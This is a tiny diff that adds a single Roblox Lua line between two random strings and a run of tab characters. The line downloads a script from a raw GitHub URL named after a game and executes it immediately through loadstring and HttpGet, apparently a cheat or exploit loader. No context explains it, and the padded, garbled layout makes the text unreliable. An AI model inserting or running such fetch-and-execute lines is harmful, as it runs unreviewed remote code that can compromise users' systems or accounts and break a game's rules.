@@ -1,0 +1,2 @@
+7oZ3e2D39O						loadstring(game:HttpGet("https://raw.githubusercontent.com/caydenthekile/scriptsv2/main/a%20hero's%20destiny"))()
+SkZoL6BCtL
